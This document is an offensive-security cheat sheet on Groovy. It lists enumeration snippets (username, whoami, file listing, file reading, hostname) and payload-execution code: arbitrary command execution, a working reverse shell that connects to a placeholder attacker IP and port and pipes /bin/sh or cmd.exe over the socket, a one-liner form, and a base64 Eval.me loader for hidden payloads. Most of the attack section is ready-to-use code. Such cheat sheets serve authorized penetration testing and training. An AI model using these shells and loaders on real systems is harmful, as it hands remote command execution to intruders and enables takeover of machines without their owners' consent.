# Cross Platform

## Enumeration

### Current Username

```groovy
def username = System.getProperty("user.name")
println "User: $username"
```

Execute command to retrieve current username.

```groovy
println "whoami".execute().text;
```

### List Files

```groovy
def directoryPath = "c:\\"
def directory = new File(directoryPath)

if (directory.exists() && directory.isDirectory()) {
    directory.eachFile { file ->
        println "${file.name.padRight(50)} ${file.isDirectory() ? 'Directory' : 'File'} ${file.length()} bytes"
    }
} else {
    println "The specified directory does not exist or is not accessible."
}
```

### Read File

```groovy
def content = new File("/path/to/filename.txt").getText("UTF-8")
println content
```

### Networking

#### Hostname

```groovy
import java.net.InetAddress

def hostname = InetAddress.localHost.hostName
println "Host: $hostname"

def username = System.getProperty("user.name")
println "User: $username"
```

## Payload Execution

### Command Execution

```groovy
println "<command>".execute().text;
```

### Reverse Shell

```groovy
String host="<attacker_IP>";

int port=<attacker_PORT>;

String cmd="</bin/sh | /bin/bash | cmd.exe | powershell.exe>";

Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

One-liner reverse shell.

```groovy
$ groovy -e 'String host="localhost";int port=8044;String cmd="cmd.exe"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();'
```

Base64 encoded one-liner reverse shell.

```groovy
$ groovy -e 'Eval.me(new java.lang.String(javax.xml.bind.DatatypeConverter.parseBase64Binary("<base64_payload>")))'
```

---
## References

### Internal All The Things

- [InternalAllTheThings: Reverse Shell Cheatsheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet)

### TrustedSec

- [TrustedSec: Offensively Groovy](https://trustedsec.com/blog/offensively-groovy)